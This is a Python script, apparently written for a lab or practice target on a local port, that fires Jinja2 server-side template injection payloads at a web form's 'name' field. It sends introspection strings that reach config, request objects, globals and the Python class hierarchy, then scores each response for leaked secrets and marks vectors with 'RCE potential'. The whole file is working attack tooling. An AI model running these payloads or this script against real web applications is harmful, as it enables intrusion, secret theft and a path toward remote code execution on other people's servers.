import requests
import json
import sys
import time

def test_payload_with_retry(session, url, payload, max_retries=3):
    """Test a payload with retry logic for connection stability"""
    
    for attempt in range(max_retries):
        try:
            data = {'name': payload}
            response = session.post(url, data=data, timeout=15)
            return response
        except requests.exceptions.Timeout:
            if attempt < max_retries - 1:
                print(f"      Timeout, retrying... (attempt {attempt + 2}/{max_retries})")
                time.sleep(1)
                continue
            else:
                raise
        except requests.exceptions.ConnectionError:
            if attempt < max_retries - 1:
                print(f"      Connection error, retrying... (attempt {attempt + 2}/{max_retries})")
                time.sleep(2)
                continue
            else:
                raise

def test_jinja2_introspection():
    """Test Jinja2 SSTI introspection payloads on /submit endpoint"""
    
    # Target endpoint
    target_url = "http://127.0.0.1:33126/submit"
    
    # Introspection payloads to test
    payloads = [
        "{{ config }}",
        "{{ request.__dict__ }}",
        "{{ globals() }}",
        "{{ locals() }}",
        "{{ request.args }}",
        "{{ request.form }}",
        "{{ _self }}",
        "{{ lipsum.__globals__ }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[:20] }}"
    ]
    
    # Create session for connection pooling
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (SSTI-Tester)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    })
    
    # Store results
    results = []
    
    print(f"JINJA2 SSTI INTROSPECTION TEST")
    print(f"Target: {target_url}")
    print(f"Payloads to test: {len(payloads)}")
    print("=" * 70)
    
    for idx, payload in enumerate(payloads, 1):
        print(f"\n[TEST {idx}/{len(payloads)}] {payload}")
        print("-" * 70)
        
        try:
            # Send POST request with payload in 'name' field
            response = test_payload_with_retry(session, target_url, payload)
            
            # Extract response information
            status_code = response.status_code
            response_text = response.text.strip()
            content_length = len(response_text)
            
            print(f"Status: {status_code} | Length: {content_length} bytes")
            print(f"Response: {response_text}")
            
            # Analyze template evaluation
            evaluation_occurred = "{{" not in response_text or payload not in response_text
            
            # Check for specific patterns in response
            analysis = {
                'payload': payload,
                'status_code': status_code,
                'content_length': content_length,
                'evaluation_occurred': evaluation_occurred,
                'has_config_info': False,
                'has_request_info': False,
                'has_class_hierarchy': False,
                'has_globals': False,
                'has_locals': False,
                'has_template_self': False,
                'has_error_message': False,
                'error_text': None,
                'vulnerable': evaluation_occurred and status_code == 200
            }
            
            # Detect different types of responses
            if any(keyword in response_text for keyword in ['Config', 'config', 'SECRET', 'DEBUG']):
                analysis['has_config_info'] = True
                print("[+] CONFIG DATA: Configuration information exposed")
            
            if "request" in response_text and any(keyword in response_text for keyword in ['.args', '.form', '.method', 'environ']):
                analysis['has_request_info'] = True
                print("[+] REQUEST OBJECT: Request context accessible")
            
            if all(keyword in response_text for keyword in ['class', 'mro', 'object']):
                analysis['has_class_hierarchy'] = True
                print("[+] CLASS HIERARCHY: Python object introspection working")
            
            if all(keyword in response_text for keyword in ['globals', '__builtins__']):
                analysis['has_globals'] = True
                print("[+] GLOBALS NAMESPACE: Global context accessible (CRITICAL)")
            
            if all(keyword in response_text for keyword in ['locals', '__builtins__']):
                analysis['has_locals'] = True
                print("[+] LOCALS NAMESPACE: Local context accessible")
            
            if "lipsum" in response_text.lower() and "globals" in response_text.lower():
                analysis['has_globals'] = True
                print("[+] LIPSUM GLOBALS: Template context globals accessible")
            
            if "_self" in response_text or "Module" in response_text or "template" in response_text.lower():
                analysis['has_template_self'] = True
                print("[+] SELF REFERENCE: Template _self/module accessible")
            
            # Check for error messages
            if status_code >= 400 or any(keyword in response_text.lower() for keyword in ['error', 'exception', 'traceback']):
                analysis['has_error_message'] = True
                analysis['error_text'] = response_text[:300] if len(response_text) > 300 else response_text
                print(f"[!] ERROR: {analysis['error_text']}")
            
            if evaluation_occurred and any(keyword in response_text for keyword in ["'{", '"{', "{'", '{"]) and len(response_text) > 50:
                print("[!] DATA EXPOSURE: Structured data (JSON/config) leaked")
            
            if content_length < 30 and ("{{" in response_text or payload in response_text):
                print("[-] Payload rendered as literal - no evaluation")
            elif evaluation_occurred:
                print(f"[!] SSTI CONFIRMED: Template evaluation occurred")
                print(f"    Content Type: {'Structured Data' if len(response_text) > 100 else 'Simple Output'}")
            
            results.append(analysis)
            print(f"    Vulnerable: {analysis['vulnerable']}")
            
        except requests.exceptions.Timeout:
            print(f"[!] TIMEOUT: Request exceeded timeout limit")
            results.append({
                'payload': payload,
                'error': 'timeout',
                'vulnerable': False
            })
        except requests.exceptions.ConnectionError as e:
            print(f"[!] CONNECTION ERROR: {str(e)}")
            results.append({
                'payload': payload,
                'error': 'connection_error',
                'vulnerable': False
            })
        except Exception as e:
            print(f"[!] UNEXPECTED ERROR: {str(e)}")
            results.append({
                'payload': payload,
                'error': str(e),
                'vulnerable': False
            })
    
    # Summary analysis
    print("\n" + "=" * 70)
    print("FINAL ANALYSIS")
    print("=" * 70)
    
    vulnerable_payloads = [r for r in results if r.get('vulnerable', False)]
    print(f"\nTotal Payloads: {len(payloads)}")
    print(f"Vulnerable (SSTI Confirmed): {len(vulnerable_payloads)}")
    print(f"Blocked/Filtered: {len(payloads) - len(vulnerable_payloads)}")
    
    if vulnerable_payloads:
        print("\n[SUCCESSFUL SSTI PAYLOADS]")
        for r in vulnerable_payloads:
            print(f"  » {r['payload']}")
            findings = []
            if r['has_config_info']:
                findings.append("config exposure")
            if r['has_request_info']:
                findings.append("request context")
            if r['has_class_hierarchy']:
                findings.append("class introspection")
            if r['has_globals']:
                findings.append("global namespace")
            if r['has_template_self']:
                findings.append("template self")
            if findings:
                print(f"     Discoveries: {', '.join(findings)}")
    
    # Identify exploitation vectors by severity
    critical_vectors = []
    high_vectors = []
    medium_vectors = []
    
    # Globals access is critical (RCE potential)
    for r in vulnerable_payloads:
        if r['has_globals']:
            critical_vectors.append(r['payload'])
        elif r['has_class_hierarchy']:
            high_vectors.append(r['payload'])
        elif r['has_template_self']:
            high_vectors.append(r['payload'])
        elif r['has_config_info']:
            medium_vectors.append(r['payload'])
        elif r['has_request_info']:
            medium_vectors.append(r['payload'])
    
    if critical_vectors:
        print(f"\n[CRITICAL VECTORS (RCE Potential)]")
        for vector in critical_vectors:
            print(f"  ✗ {vector}")
    
    if high_vectors:
        print(f"\n[HIGH SEVERITY VECTORS]")
        for vector in high_vectors:
            print(f"  ✗ {vector}")
    
    if medium_vectors:
        print(f"\n[MEDIUM SEVERITY VECTORS]")
        for vector in medium_vectors:
            print(f"  ✗ {vector}")
    
    # Template engine detection
    if any("lipsum" in r.get('payload', '') and r.get('vulnerable') for r in results):
        print(f"\n[TEMPLATE ENGINE CONFIRMED]")
        print(f"  → Jinja2 (lipsum object accessible)")
    elif any("config" in r.get('payload', '') and r.get('vulnerable') for r in results):
        print(f"\n[TEMPLATE ENGINE LIKELY]")
        print(f"  → Flask/Jinja2 (config object present)")
    
    # Determine if deep exploitation is possible
    deep_exploitation_possible = any(r.get('has_globals') or r.get('has_class_hierarchy') for r in vulnerable_payloads)
    
    if deep_exploitation_possible:
        print(f"\n[EXPLOITATION POTENTIAL]")
        print(f"  ✓ Remote Code Execution likely achievable")
        print(f"  ✓ Config/secrets extraction possible")
        print(f"  ✓ Server environment enumeration accessible")
    elif vulnerable_payloads:
        print(f"\n[EXPLOITATION POTENTIAL]")
        print(f"  ✓ Limited SSTI (information disclosure)")
        print(f"  ⚠ Full RCE may require additional vectors")
    else:
        print(f"\n[EXPLOITATION POTENTIAL]")
        print(f"  ✗ No SSTI vulnerability detected")
    
    print(f"\n" + "=" * 70)
    print("Test completed. Analyze above results for exploitation path.")
    print("=" * 70)

if __name__ == '__main__':
    test_jinja2_introspection()

